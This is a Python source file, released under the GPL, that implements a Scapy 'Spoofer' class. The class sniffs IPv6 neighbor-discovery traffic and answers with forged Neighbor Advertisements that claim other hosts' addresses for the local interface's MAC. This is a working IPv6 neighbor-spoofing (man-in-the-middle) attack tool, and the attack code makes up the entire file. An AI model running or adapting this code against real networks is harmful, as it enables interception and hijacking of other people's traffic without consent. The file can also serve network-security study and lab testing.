#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement Spoofer class. """

###################
#    This file implement Spoofer class.
#    Copyright (C) 2021  gitlab.com@ChrisASSR, gitlab.com@tHz_FireStorm, gitlab.com@lecorrem, gitlab.com@mrbouk

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from scapy.all import (
    sniff, 
    IPv6, 
    ICMPv6ND_NS, 
    Ether, 
    ICMPv6ND_NA, 
    send, 
    get_if_hwaddr,
    ICMPv6NDOptDstLLAddr,
    conf
)

__all__ = ["Spoofer"]


class Spoofer:
    def __init__(self, target="all", sniffer=None, verbose=False):
        self.target = target
        self.sniffer = sniffer
        self.verbose = verbose

        if target == "all":
            self.filter = lambda packet: (
                packet.haslayer(IPv6)
                and (packet.haslayer(ICMPv6ND_NS)
                or packet.haslayer(ICMPv6ND_NA))
            )
        else:
            self.filter = lambda packet: (
                packet.haslayer(IPv6)
                and packet.haslayer(ICMPv6ND_NS)
                and packet.haslayer(ICMPv6ND_NA)
                and (packet.getlayer(IPv6).src == target
                or packet.getlayer(IPv6).dst == target)
            )

    def launcher(self):
        try:
            sniff(lfilter=self.filter, prn=self.spoof)
        except KeyboardInterrupt:
            print("Please wait...")
        finally:
            if self.sniffer:
                self.sniffer.stop()

    def spoof(self, packet):
        ip_src = packet.getlayer(IPv6).dst
        ip_dst = packet.getlayer(IPv6).src
        mac_dest = packet.getlayer(Ether).dst

        response = (
            Ether(dst=mac_dest)
            / IPv6(src=ip_src, dst=ip_dst)
            / ICMPv6ND_NA(S=1, O=1, tgt=ip_src)
            / ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(conf.iface))
        )

        send(response, verbose=0)

        if self.verbose:
            print(response.summary())
